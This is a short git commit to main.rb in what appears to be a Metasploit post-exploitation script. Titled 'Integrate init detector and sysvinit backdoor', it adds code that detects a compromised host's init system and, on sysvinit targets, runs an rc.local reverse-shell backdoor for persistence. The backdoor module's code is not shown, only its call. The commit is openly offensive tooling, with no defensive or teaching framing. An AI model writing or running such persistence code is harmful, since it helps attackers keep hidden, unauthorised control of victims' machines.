33538f83ff5dec36a31f57a509cb0b67268b49f7
leandro <38253462+lst15@users.noreply.github.com>
2025-12-12 02:48:00 -0300

    Integrate init detector and sysvinit backdoor
    Added initialization detection and sysvinit handling.

--- main.rb
+++ main.rb
@@ -1,5 +1,7 @@
 require '/home/msf/session_sanitizer'
 require '/home/msf/shell_promotion'
+require 'init_detector'
+require 'sysvinit_backdoor_rc_local'
 
 fm        = client.framework
 target_ip = client.session_host
@@ -10,3 +12,9 @@ SessionSanitizer.run(fm, target_ip, sid)
 print("\n")
 ShellPromotion.run(fm, sid, target_ip, client)
 print("\n")
+
+init_type = InitDetector.detect(session)
+
+if init_type == :sysvinit
+  RcLocalReverseShell.run(session)
+end
